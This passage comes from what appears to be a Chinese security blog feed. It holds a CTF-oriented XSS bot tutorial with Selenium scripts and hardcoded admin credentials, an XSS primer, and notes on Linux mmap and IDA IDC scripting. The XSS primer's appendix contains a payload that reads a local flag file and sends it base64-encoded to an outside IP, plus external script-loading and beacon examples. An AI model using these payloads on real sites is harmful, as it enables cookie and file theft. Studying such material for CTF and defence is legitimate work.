class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> selenium</div><div class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver  </div><div class="line"><span class="keyword">from</span> selenium.webdriver.common.keys <span class="keyword">import</span> Keys  </div><div class="line"><span class="keyword">from</span> selenium.common.exceptions <span class="keyword">import</span> WebDriverException</div><div class="line"><span class="keyword">import</span> os </div><div class="line"><span class="keyword">import</span> time </div><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line"><span class="keyword">from</span> pyvirtualdisplay <span class="keyword">import</span> Display</div><div class="line"></div><div class="line">display = Display(visible=<span class="number">0</span>, size=(<span class="number">800</span>,<span class="number">800</span>))</div><div class="line">display.start()</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">	<span class="keyword">try</span>:</div><div class="line">		s = requests.Session()</div><div class="line">		url = <span class="string">'http://xxx/checksql.php'</span></div><div class="line">		r = s.get(url)</div><div class="line"></div><div class="line">		<span class="keyword">if</span> <span class="string">"存在"</span> <span class="keyword">in</span> r.text:</div><div class="line"></div><div class="line">			<span class="keyword">try</span>:</div><div class="line">				chromedriver = <span class="string">"C:\Users\Administrator\AppData\Local\Google\Chrome\Application\chromedriver.exe"</span>  </div><div class="line">				os.environ[<span class="string">"webdriver.chrome.driver"</span>] = chromedriver  </div><div class="line">				browser = webdriver.Chrome(chromedriver) </div><div class="line">				</div><div class="line">				browser.set_page_load_timeout(<span class="number">10</span>)</div><div class="line">				browser.set_script_timeout(<span class="number">10</span>)</div><div class="line"></div><div class="line"></div><div class="line">				url = <span class="string">"http://xxxxxx/admin_321321321.php"</span>  	</div><div class="line">				browser.get(url)</div><div class="line">				browser.add_cookie(&#123;<span class="string">'name'</span>: <span class="string">'admin'</span>,</div><div class="line">				 <span class="string">'value'</span> : <span class="string">'arandomstring'</span>,</div><div class="line">				 <span class="string">'path'</span> : <span class="string">'/'</span>&#125;)</div><div class="line"></div><div class="line"></div><div class="line">				browser.get(url)</div><div class="line">				<span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">					<span class="keyword">try</span>:</div><div class="line">						browser.switch_to_alert().accept()</div><div class="line">					<span class="keyword">except</span> selenium.common.exceptions.NoAlertPresentException:</div><div class="line">						<span class="keyword">break</span></div><div class="line">				<span class="keyword">print</span> browser.title</div><div class="line">				<span class="keyword">print</span> time.strftime(<span class="string">"%Y-%m-%d %X"</span>, time.localtime())</div><div class="line">				time.sleep(<span class="number">10</span>)</div><div class="line">				browser.quit()</div><div class="line">				time.sleep(<span class="number">1</span>)</div><div class="line"></div><div class="line">			<span class="keyword">except</span> Exception <span class="keyword">as</span> e: </div><div class="line">				<span class="keyword">print</span> <span class="string">"[error] "</span>+str(e)</div><div class="line">				browser.quit()</div><div class="line"></div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			<span class="keyword">print</span> time.strftime(<span class="string">"%Y-%m-%d %X"</span>, time.localtime())</div><div class="line">			<span class="keyword">print</span> <span class="string">"[info] no unread messages"</span></div><div class="line">			exit(<span class="number">0</span>)</div><div class="line"></div><div class="line">	<span class="keyword">except</span> Exception <span class="keyword">as</span> e: </div><div class="line">		<span class="keyword">print</span> <span class="string">"[error] "</span>+str(e)</div></pre></td></tr></table></figure>
<p>上面的代码配合crontab应该可以很好的应付这类xss的各种问题</p>
<h2 id="聊天类的交互式xss"><a href="#聊天类的交互式xss" class="headerlink" title="聊天类的交互式xss"></a>聊天类的交互式xss</h2><p>这类xss最明显的特点就是admin用户和别的用户并没有区别，也就是说bot想要打开被攻击者注入的页面，也必须经过登录，服务端设置session来登录，那么上面的办法就行不通了，最好的办法就是模拟登录。</p>
<p>这类xss最大的问题其实就是信息的隔离方式，如果聊天的交互方式本身就是显示在同一页面上的话，很显然的问题就是，如果有一个攻击者试图干扰bot的运行，他只要再每个round发送<code>&lt;xmp&gt;</code>就可以导致js无法执行，这是个我到现在还没想明白的问题。先分享现在我使用的bot</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> selenium</div><div class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver  </div><div class="line"><span class="keyword">from</span> selenium.webdriver.common.keys <span class="keyword">import</span> Keys  </div><div class="line"><span class="keyword">from</span> selenium.common.exceptions <span class="keyword">import</span> WebDriverException</div><div class="line"><span class="keyword">import</span> os </div><div class="line"><span class="keyword">import</span> time </div><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line"><span class="keyword">from</span> pyvirtualdisplay <span class="keyword">import</span> Display</div><div class="line"></div><div class="line">display = Display(visible=<span class="number">0</span>, size=(<span class="number">800</span>,<span class="number">800</span>))</div><div class="line">display.start()</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">2</span>):</div><div class="line"></div><div class="line">	<span class="keyword">try</span>:</div><div class="line">		browser = webdriver.Firefox()</div><div class="line">		browser.set_page_load_timeout(<span class="number">10</span>)</div><div class="line">		browser.set_script_timeout(<span class="number">10</span>)</div><div class="line"></div><div class="line"></div><div class="line">		url = <span class="string">"http://52.80.63.91/login.php"</span>  	</div><div class="line">		browser.get(url)</div><div class="line"></div><div class="line">		elem = browser.find_element_by_name(<span class="string">"user"</span>)</div><div class="line">		elem.clear()</div><div class="line">		elem.send_keys(<span class="string">'admin'</span>)</div><div class="line">		elem = browser.find_element_by_name(<span class="string">"pass"</span>)</div><div class="line">		elem.clear()</div><div class="line">		elem.send_keys(<span class="string">'admmin332indadmin33213'</span>)</div><div class="line">		elem = browser.find_element_by_name(<span class="string">"login"</span>)</div><div class="line">		elem.click()</div><div class="line"></div><div class="line">		<span class="keyword">print</span> <span class="string">"login success"</span></div><div class="line">	</div><div class="line">		browser.add_cookie(&#123;<span class="string">'name'</span>: <span class="string">'admin'</span>,</div><div class="line">		 <span class="string">'value'</span> : <span class="string">'arandomstring'</span>,</div><div class="line">		 <span class="string">'path'</span> : <span class="string">'/adminshigesha233e3333/'</span>&#125;)</div><div class="line"></div><div class="line">		<span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">			<span class="keyword">try</span>:</div><div class="line">				browser.switch_to_alert().accept()</div><div class="line"></div><div class="line">			<span class="keyword">except</span> selenium.common.exceptions.NoAlertPresentException:</div><div class="line">				<span class="keyword">break</span></div><div class="line"></div><div class="line">		<span class="keyword">print</span> browser.title</div><div class="line">		<span class="keyword">print</span> time.strftime(<span class="string">"%Y-%m-%d %X"</span>, time.localtime())</div><div class="line">		time.sleep(<span class="number">10</span>)</div><div class="line">		browser.quit()</div><div class="line">		time.sleep(<span class="number">1</span>)</div><div class="line">	<span class="keyword">except</span> Exception <span class="keyword">as</span> e: </div><div class="line">		<span class="keyword">print</span> <span class="string">"[ERROR] "</span>+str(e)</div><div class="line">		<span class="comment">#important</span></div><div class="line">		browser.quit()</div><div class="line"></div><div class="line"></div><div class="line">url2 = <span class="string">'http://xxxx/cl33e3ar5ql.php'</span></div><div class="line">r = s.get(url2)</div><div class="line"></div><div class="line"><span class="keyword">print</span> r.text</div><div class="line"><span class="keyword">print</span> time.strftime(<span class="string">"%Y-%m-%d %X"</span>, time.localtime())</div></pre></td></tr></table></figure>
<p>上面的代码通过setkey模拟登录，然后设置后台的cookie，每次payload执行2次，然后清理掉admin除预留信息以外的所有payload，避免恶意payload导致的所有payload无效。</p>
<p>配合crontab可以保证bot的持久性，如果不放心bot的稳定性，还可以在脚本执行结束后，执行命令kill掉所有的firefox残留进程。</p>
<p>到此为止，一个完整的xss bot就完成了，虽然可能不是最完美的解决方案，希望会有更好的解决办法:&gt;</p>
]]></content>
      
        <categories>
            
            <category> web </category>
            
        </categories>
        
        
        <tags>
            
            <tag> xss </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[xss简介]]></title>
      <url>/2017/09/21/xss%E7%AE%80%E4%BB%8B/</url>
      <content type="html"><![CDATA[<p>自从xss被发现之后，OWASP上经常会出现它的身影。一开始xss作为一种攻击方式，应用并不算广。但是随着漏洞利用的深入钻研，安全研究者们逐渐发现xss的危害，特别是在用户授权与管理方面。</p>
<p>国内外各大web安全检测厂商，已经在其产品中加入了xss检查、过滤等功能。</p>
<h3 id="1、XSS原理"><a href="#1、XSS原理" class="headerlink" title="1、XSS原理"></a>1、XSS原理</h3><p>JavaScript可以用来获取用户的Cookie、改变网页内容、URL跳转。于是，我们就可以从存在XSS漏洞的网站中，盗取用户Cookie、黑掉页面、导航到恶意网站。</p>
<p>通常使用<script src="http://www.secbug.org/x.txt"></script>方式来加载外部脚本，而在x.txt中就存放着攻击者的恶意JavaScript代码，这段代码可能是用来盗取用户的Cookie，也可能是监控键盘记录等恶意行为。</p>
<p>备注：JavaScript加载外部的代码文件可以是任意扩展名(无扩展名也可以)</p>
<h3 id="2、XSS类型"><a href="#2、XSS类型" class="headerlink" title="2、XSS类型"></a>2、XSS类型</h3><h4 id="2-1-反射型XSS"><a href="#2-1-反射型XSS" class="headerlink" title="2.1 反射型XSS"></a>2.1 反射型XSS</h4><p>反射型XSS也被称为非持久性XSS，是现在最容易出现的一种XSS漏洞。</p>
<p>XSS的Payload一般是写在URL中，之后设法让被害者点击这个链接。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span>  </div><div class="line">     username = _GET[<span class="string">'username'</span>];  </div><div class="line">     <span class="keyword">echo</span> $username;  </div><div class="line"><span class="meta">?&gt;</span>  </div><div class="line"> </div><div class="line">利用样例：</div><div class="line">http:<span class="comment">//www.secbug.org/xss.php?username=&lt;script&gt;alert(/xss/)&lt;/script&gt;</span></div></pre></td></tr></table></figure>
<h4 id="2-2-存储型XSS"><a href="#2-2-存储型XSS" class="headerlink" title="2.2 存储型XSS"></a>2.2 存储型XSS</h4><p>存储型XSS又被称为持久性XSS，存储型XSS是最危险的一种跨站脚本。</p>
<p>存储型XSS被服务器端接收并存储，当用户访问该网页时，这段XSS代码被读出来响应给浏览器。</p>
<p>反射型XSS与DOM型XSS都必须依靠用户手动去触发，而存储型XSS却不需要。</p>
<p>测试步骤如下，以留言板为例：</p>
<p>（1）添加正常的留言，使用Firebug快速寻找显示标签</p>
<p>（2）判断内容输出（显示）的地方是在标签内还是在标签属性内，或者在其他地方。如果显示区域不在HTML属性内，则可以直接使用xss代码注入。如果在属性内，需要先闭合标签再写入xss代码。如果不能得知内容输出的具体位置，则可以使用模糊测试方案。</p>
<p>（3）在插入xss payload代码后，重新加载留言页面，xss代码被浏览器执行。</p>
<h4 id="2-3-DOM-XSS"><a href="#2-3-DOM-XSS" class="headerlink" title="2.3 DOM XSS"></a>2.3 DOM XSS</h4><p>DOM的全称为Document Object Model，即文档对象模型。</p>
<p>基于DOM型的XSS是不需要与服务器交互的，它只发生在客户端处理数据阶段。简单理解DOM XSS就是出现在javascript代码中的xss漏洞。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;  </div><div class="line"><span class="keyword">var</span> temp = document.URL;<span class="comment">//获取URL  </span></div><div class="line"><span class="keyword">var</span> index = document.URL.indexOf(<span class="string">"content="</span>)+<span class="number">4</span>;  </div><div class="line"><span class="keyword">var</span> par = temp.substring(index);  </div><div class="line">document.write(decodeURI(par));<span class="comment">//输入获取内容  </span></div><div class="line">&lt;/script&gt;  </div><div class="line"></div><div class="line">利用样例：</div><div class="line">http:<span class="comment">//www.secbug.org/dom.html?content=&lt;script&gt;alert(/xss/)&lt;/script&gt;</span></div></pre></td></tr></table></figure>
<p>这种利用也需要受害者点击链接来触发，DOM型XSS是前端代码中存在了漏洞，而反射型是后端代码中存在了漏洞。</p>
<p>反射型和存储型xss是服务器端代码漏洞造成的，payload在响应页面中，在dom xss中，payload不在服务器发出的HTTP响应页面中，当客户端脚本运行时（渲染页面时），payload才会加载到脚本中执行。</p>
<h3 id="3、利用工具"><a href="#3、利用工具" class="headerlink" title="3、利用工具"></a>3、利用工具</h3><h4 id="3-1-xss接收工具"><a href="#3-1-xss接收工具" class="headerlink" title="3.1 xss接收工具"></a>3.1 xss接收工具</h4><p>谈到xss的利用工具，这里不得不提到火日大神，其在github上的工具<a href="https://github.com/firesunCN/BlueLotus_XSSReceiver" target="_blank" rel="external">https://github.com/firesunCN/BlueLotus_XSSReceiver</a></p>
<p>这个工具是ctf中xss应用的经典工具</p>
<p><strong>另外一个工具就是nc</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> nc -l -p 8080</span></div><div class="line">GET /1.jpg HTTP/1.1</div><div class="line">Host: 10.254.20.127:8080</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</div><div class="line">Accept-Language: zh,zh-CN;q=0.5</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Connection: keep-alive</div><div class="line">Upgrade-Insecure-Requests: 1</div></pre></td></tr></table></figure>
<p>当外界请求<a href="http://10.254.20.127:8080/1.jpg的时候，就会出现上面的信息。" target="_blank" rel="external">http://10.254.20.127:8080/1.jpg的时候，就会出现上面的信息。</a></p>
<h4 id="3-2-xss检测工具"><a href="#3-2-xss检测工具" class="headerlink" title="3.2 xss检测工具"></a>3.2 xss检测工具</h4><p>xss检测工具很多，现在xsser、xssf</p>
<p>说真的，两个检测工具不怎么好用，还不如手工呢！</p>
<p>另外就是xssor，可以访问</p>
<p><a href="https://github.com/evilcos/xssor2" target="_blank" rel="external">https://github.com/evilcos/xssor2</a></p>
<p><a href="http://xssor.io/" target="_blank" rel="external">http://xssor.io/</a></p>
<h3 id="4、附录"><a href="#4、附录" class="headerlink" title="4、附录"></a>4、附录</h3><p>xss一般请求方式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?evilcode=&lt;script&gt;&lt;img src=&quot;http://xxxx/xss.jpg&quot;/&gt;&lt;/script&gt;</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?evalcode=&lt;script&gt;var xmlhttp= new XMLHttpRequest();xmlhttp.open(&quot;GET&quot;,&quot;file:///var/www/html/flag.php&quot;,true);xmlhttp.onload = function () &#123;content = btoa(xmlhttp.responseText);window.location.href=&quot;http://118.190.78.155:8080/index.php?a=&quot;%2bcontent;&#125;;xmlhttp.send(null);&lt;/script&gt;</div></pre></td></tr></table></figure>
<p>btoa(&quot;str&quot;)   ===&gt;  base64加密字符串</p>
<p>atob(&quot;ABSCRF==&quot;)    ===&gt;  base64解密字符串</p>
]]></content>
      
        <categories>
            
            <category> web </category>
            
        </categories>
        
        
        <tags>
            
            <tag> xss </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Linux内存映射函数mmap函数详解]]></title>
      <url>/2017/09/19/Linux%E5%86%85%E5%AD%98%E6%98%A0%E5%B0%84%E5%87%BD%E6%95%B0mmap%E5%87%BD%E6%95%B0%E8%AF%A6%E8%A7%A3/</url>
      <content type="html"><![CDATA[<p>mmap将一个文件或者其它对象映射进内存。文件被映射到多个页上，如果文件的大小不是所有页的大小之和，最后一个页不被使用的空间将会清零。mmap在用户空间映射调用系统中作用很大。</p>
<h3 id="函数原型"><a href="#函数原型" class="headerlink" title="函数原型"></a>函数原型</h3><blockquote>
<p>void<em> mmap(void</em> start,size_t length,int prot,int flags,int fd,off_t offset);</p>
<p>int munmap(void* start,size_t length);</p>
</blockquote>
<p>mmap 必须以PAGE_SIZE为单位进行映射，而内存也只能以页为单位进行映射，若要映射非PAGE_SIZE整数倍的地址范围，要先进行内存对齐，强行以PAGE_SIZE的倍数大小进行映射。</p>
<h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><p>下面说一下内存映射的步骤:</p>
<ol>
<li>用open系统调用打开文件, 并返回描述符fd.</li>
<li>用mmap建立内存映射, 并返回映射首地址指针start.</li>
<li>对映射(文件)进行各种操作, 显示(printf), 修改(sprintf)</li>
<li>用munmap(void *start, size_t length)关闭内存映射.</li>
<li>用close系统调用关闭文件fd.</li>
</ol>
<h3 id="mmap函数的主要用途"><a href="#mmap函数的主要用途" class="headerlink" title="mmap函数的主要用途"></a>mmap函数的主要用途</h3><p>1、将一个普通文件映射到内存中，通常在需要对文件进行频繁读写时使用，这样用内存读写取代I/O读写，以获得较高的性能；</p>
<p>2、将特殊文件进行匿名内存映射，可以为关联进程提供共享内存空间；</p>
<p>3、为无关联的进程提供共享内存空间，一般也是将一个普通文件映射到内存中。</p>
<h3 id="mmap函数说明"><a href="#mmap函数说明" class="headerlink" title="mmap函数说明"></a>mmap函数说明</h3><p><strong>参数start</strong></p>
<p>指向欲映射的内存起始地址，通常设为 NULL，代表让系统自动选定地址，映射成功后返回该地址。</p>
<p><strong>参数length</strong></p>
<p>代表将文件中多大的部分映射到内存。</p>
<p><strong>参数prot</strong></p>
<p>映射区域的保护方式。可以为以下几种方式的组合：</p>
<p>PROT_EXEC 映射区域可被执行</p>
<p>PROT_READ 映射区域可被读取</p>
<p>PROT_WRITE 映射区域可被写入</p>
<p>PROT_NONE 映射区域不能存取</p>
<p><strong>参数flags</strong></p>
<p>影响映射区域的各种特性。在调用mmap()时必须要指定MAP_SHARED 或MAP_PRIVATE。</p>
<p>MAP_FIXED 如果参数start所指的地址无法成功建立映射时，则放弃映射，不对地址做修正。通常不鼓励用此标志。</p>
<p>MAP_SHARED对映射区域的写入数据会复制回文件内，而且允许其他映射该文件的进程共享。</p>
<p>MAP_PRIVATE 对映射区域的写入操作会产生一个映射文件的复制，即私人的“写入时复制”（copy on write）对此区域作的任何修改都不会写回原来的文件内容。</p>
<p>MAP_ANONYMOUS建立匿名映射。此时会忽略参数fd，不涉及文件，而且映射区域无法和其他进程共享。</p>
<p>MAP_DENYWRITE只允许对映射区域的写入操作，其他对文件直接写入的操作将会被拒绝。</p>
<p>MAP_LOCKED 将映射区域锁定住，这表示该区域不会被置换（swap）。</p>
<p><strong>参数fd</strong></p>
<p>要映射到内存中的文件描述符。如果使用匿名内存映射时，即flags中设置了MAP_ANONYMOUS，fd设为-1。有些系统不支持匿名内存映射，则可以使用fopen打开/dev/zero文件，然后对该文件进行映射，可以同样达到匿名内存映射的效果。</p>
<p><strong>参数offset</strong></p>
<p>文件映射的偏移量，通常设置为0，代表从文件最前方开始对应，offset必须是分页大小的整数倍。</p>
<p><strong>返回值</strong></p>
<p>若映射成功则返回映射区的内存起始地址，否则返回MAP_FAILED(－1)，错误原因存于errno 中。</p>
<p><strong>错误代码</strong></p>
<p>EBADF  参数fd不是有效的文件描述词</p>
<p>EACCES 存取权限有误。如果是MAP_PRIVATE 情况下文件必须可读，使用</p>
<p>MAP_SHARED则要有PROT_WRITE以及该文件要能写入。</p>
<p>EINVAL 参数start、length 或offset有一个不合法。</p>
<p>EAGAIN 文件被锁住，或是有太多内存被锁住。</p>
<p>ENOMEM 内存不足。</p>
]]></content>
      
        <categories>
            
            <category> code </category>
            
        </categories>
        
        
        <tags>
            
            <tag> heap </tag>
            
            <tag> linux </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[IDA的调试脚本idc]]></title>
      <url>/2017/09/18/IDA%E7%9A%84%E8%B0%83%E8%AF%95%E8%84%9A%E6%9C%ACidc/</url>
      <content type="html"><![CDATA[<p>IDA的脚本有两种，一种是idc，另一种是IDAPython。</p>
<p>可以通过File-&gt;Script file；File-&gt;Script command访问IDA的脚本引擎。</p>
<h2 id="1、IDC语言"><a href="#1、IDC语言" class="headerlink" title="1、IDC语言"></a>1、IDC语言</h2><h3 id="1-1-IDC变量"><a href="#1-1-IDC变量" class="headerlink" title="1.1 IDC变量"></a>1.1 IDC变量</h3><p>IDC的3种数据类型：整数（IDA文档使用类型名称long）、字符串和浮点值。当然也包括对象、引用和函数指针</p>
<h4 id="1-1-1-局部变量声明"><a href="#1-1-1-局部变量声明" class="headerlink" title="1.1.1 局部变量声明"></a>1.1.1 局部变量声明</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">auto addr, reg, val;	//legal, multiple variables declared with no initializers</div><div class="line">auto count = 0;			// declaration with initialization</div></pre></td></tr></table></figure>
<p>IDC认可使用/**/的C风格多行注释，//的行注释</p>
<h4 id="1-1-2-全局变量声明"><a href="#1-1-2-全局变量声明" class="headerlink" title="1.1.2 全局变量声明"></a>1.1.2 全局变量声明</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">extern outsideGlobal;</div><div class="line">static main()&#123;</div><div class="line">	extern insideGlobal;</div><div class="line">	outsideGlobal = &quot;Global&quot;;</div><div class="line">	insideGlobal = 1;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>可以在函数内部或外部声明全部变量，但不能子啊声明变量的时候提供初始值。</p>
<h3 id="1-2-IDC表达式"><a href="#1-2-IDC表达式" class="headerlink" title="1.2 IDC表达式"></a>1.2 IDC表达式</h3><p>除了少数几个特例外，IDC几乎支持C的所有算数和逻辑运算符，包括三元运算(?:)，但是不支持op=（+=、*=、&gt;&gt;=等）形式的符合赋值运算符。</p>
<p>IDC的字符串运算与C的有所不同。在IDC中，支持类python的字符串复制、拼接、分片操作。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">auto str=&quot;String to slice&quot;;</div><div class="line">auto s1,s2,s3,s4;</div><div class="line">s1 = str[7:9];</div></pre></td></tr></table></figure>
<p>需要注意的是IDC没有数组数据类型。</p>
<h3 id="1-3-IDC语句"><a href="#1-3-IDC语句" class="headerlink" title="1.3 IDC语句"></a>1.3 IDC语句</h3><p>IDC的语句以很好结束。switch语句是IDC唯一不支持的C风格复合语句。在使用for循环的时候，需要记住的是，IDC不支持复合赋值运算符op=。</p>
<p>并且IDC引入了try/catch块和相关的switch语句，在语法上它们类似C++一场处理。</p>
<p>IDC的块中，可以声明新的变量，只要变量声明位于花括号内的第一个语句即可。但是IDC并不严格限制新引入的变量的作用范围，因此，你可以在声明这些变量的花括号以外引用它们。</p>
<h3 id="1-4-IDC函数"><a href="#1-4-IDC函数" class="headerlink" title="1.4 IDC函数"></a>1.4 IDC函数</h3><p>IDC仅仅在独立程序(.idc文件)中支持用户定义的函数。iDC命令对话框不支持用户定义的函数。IDC用于声明用户定义的函数的语法与C语言的差异甚大。在IDC中，static关键字用于引入一个用户定义的函数，函数的参数列表仅包含一个以逗号分隔的参数名列表。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">static my_func(x, y, z)&#123;</div><div class="line">  auto a,b,c;</div><div class="line">  ......  </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>并且参数可以采用传值或者传参的方式。</p>
<p>现在已经可以将函数引用作为一个参数传递给另一个函数，并将函数引用作为函数的返回结果。下面的代码清单说明了使用函数参数和函数作为返回值的情况。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">static getFunc()&#123;</div><div class="line">  return Message; //return the built-in Message function as a result</div><div class="line">&#125;</div><div class="line">static useFunc(func, arg)&#123;</div><div class="line">  func(arg);  // func here is expected to be a function reference</div><div class="line">&#125;</div><div class="line">static main()&#123;</div><div class="line">  auto f = getFunc();  </div><div class="line">  f(&quot;Hello world!\n&quot;);  // invoke the returned function f</div><div class="line">  useFunc(f, &quot;XXS&quot;);	// no need for &amp; operator, functions always call-by-reference</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="1-5-IDC对象"><a href="#1-5-IDC对象" class="headerlink" title="1.5 IDC对象"></a>1.5 IDC对象</h3><p>IDC定义了一个成为object的根类，最终所有类都是由它衍生而来，并且在创建新类时支持单一继承。IDC并不使用访问说明符，如public或private，所有类成员均为有效公共类。类声明仅包含类成员函数的定义。要在类中创建数据成员，只需要创建一个给数据成员赋值的赋值语句即可。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">class ExampleClass&#123;</div><div class="line">  ExampleClass(x,y)&#123; // constructor</div><div class="line">    this.a = x;	// all ExampleClass objects hava data member a</div><div class="line">    this.b = y;	// all ExampleClass objects hava data member b</div><div class="line">  &#125;</div><div class="line">  ~ExampleClass()&#123;  // destructor</div><div class="line">  &#125;</div><div class="line">  foo(x)&#123;</div><div class="line">    this.a = this.a + x;</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">staic main()&#123;</div><div class="line">  /* ExampleClass ex;*/ // this is not a valid variable declaration</div><div class="line">  auto ex = ExampleClass(1,2);	// this is right</div><div class="line">  ex.foo(10);</div><div class="line">  ex.z = &quot;string&quot;;	// object ex now has a member z, BUT class does not</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="1-6-IDC程序"><a href="#1-6-IDC程序" class="headerlink" title="1.6 IDC程序"></a>1.6 IDC程序</h3><p>需要有主函数，并且主程序文件还必须包含idc.idc文件以获得它包含的有用宏定义。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">#include &lt;idc.idc&gt;	// useful include directive</div><div class="line">static main()&#123;</div><div class="line">  // do something</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>IDC认可的预处理指令</p>
<ul>
<li>#include &lt;文件&gt;</li>
<li>#define&lt;宏名称&gt;[可选值]      创建一个宏，可以选择给它分配指定的值。IDC预定义了许多宏来测试脚本执行环境，如\<em>NT\</em>、\<em>LINUX\</em>、\<em>MAC\</em>、\<em>GUI\</em>、\<em>TXT\</em></li>
<li>#ifdef&lt;名称&gt;  测试指定的宏是否存在，如果存在，可以选择处理其后的任何语句</li>
<li>#else  与上面的#ifdef配合使用</li>
<li>#endif</li>
<li>#undef&lt;名称&gt;  删除指定宏</li>
</ul>
<h3 id="1-7-IDC错误处理"><a href="#1-7-IDC错误处理" class="headerlink" title="1.7 IDC错误处理"></a>1.7 IDC错误处理</h3><p>运行IDC脚本时，可能遇到两种错误：解析错误、运行时错误。</p>
<p>解析错误指的是令程序无法运行的错误，包括语法错误、引用未定义变量、函数参数数量错误等。</p>
